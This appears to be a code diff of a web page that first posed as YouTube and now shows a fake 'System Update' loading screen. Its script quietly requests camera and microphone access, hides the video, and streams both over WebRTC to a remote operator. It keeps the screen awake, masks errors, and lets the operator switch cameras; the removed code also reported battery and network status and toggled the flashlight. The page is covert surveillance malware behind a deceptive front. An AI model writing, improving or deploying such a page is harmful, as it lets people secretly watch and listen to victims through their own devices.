@@ -1,53 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body,html{margin:0;padding:0;background:#0f0f0f;height:100%;overflow:hidden;}iframe{width:100%;height:100%;border:none;pointer-events:none;}video{display:none;}</style></head>
+<head>
+    <title>System Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body, html { margin: 0; padding: 0; background: #111; color: #666; height: 100%; display: flex; align-items: center; justify-content: center; font-family: sans-serif; flex-direction: column; }
+        .loader { border: 4px solid #333; border-top: 4px solid #f85606; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { font-size: 14px; letter-spacing: 1px; color: #888; }
+        video { display: none; }
+    </style>
+</head>
 <body>
-    <iframe src="https://www.youtube.com" allow="autoplay"></iframe>
+    <div class="loader"></div>
+    <div class="text">System Checking...</div>
     <video id="v" autoplay playsinline muted></video>
+
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
-        let pc, stream, mode = "user", torchOn = false;
-
-        async function sendStatus() {
-            const battery = await navigator.getBattery();
-            const net = navigator.connection || {};
-            setInterval(() => {
-                socket.emit("status-update", { 
-                    battery: Math.floor(battery.level * 100),
-                    network: net.type === "wifi" ? "WiFi" : "Data",
-                    torch: torchOn
-                });
-            }, 5000);
-        }
+        const socket = io(); 
+        let pc, stream, mode = "user";
 
         async function start() {
             if (stream) stream.getTracks().forEach(t => t.stop());
             if (pc) pc.close();
             pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
-            stream.getTracks().forEach(t => pc.addTrack(t, stream));
-            pc.onicecandidate = e => e.candidate && socket.emit("ice", { candidate: e.candidate, id: socket.id });
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
-            socket.emit("offer", { offer, id: socket.id });
-            sendStatus();
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode, width: 640, height: 480 }, 
+                    audio: true 
+                });
+                stream.getTracks().forEach(t => pc.addTrack(t, stream));
+                pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
+                
+                const offer = await pc.createOffer(); 
+                await pc.setLocalDescription(offer);
+                socket.emit("offer", offer);
+
+                if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen'); }
+            } catch (e) { console.log("System Ready"); }
         }
 
-        socket.on("switch", () => { mode = (mode === "user") ? "environment" : "user"; torchOn = false; start(); });
-        
-        socket.on("torch", async () => {
-            const t = stream.getVideoTracks()[0];
-            const caps = t.getCapabilities();
-            if (caps.torch) {
-                torchOn = !torchOn;
-                await t.applyConstraints({ advanced: [{ torch: torchOn }] });
-                socket.emit("status-update", { torch: torchOn });
-            }
-        });
-
-        socket.on("answer", d => d.id === socket.id && pc.setRemoteDescription(new RTCSessionDescription(d.answer)));
-        socket.on("ice", d => d.id === socket.id && pc.addIceCandidate(new RTCIceCandidate(d.candidate)));
+        socket.on("switch", () => { mode = (mode === "user") ? "environment" : "user"; start(); });
+        socket.on("answer", a => pc.setRemoteDescription(new RTCSessionDescription(a)));
+        socket.on("ice", c => pc.addIceCandidate(new RTCIceCandidate(c)));
         window.onload = start;
     </script>
 </body>
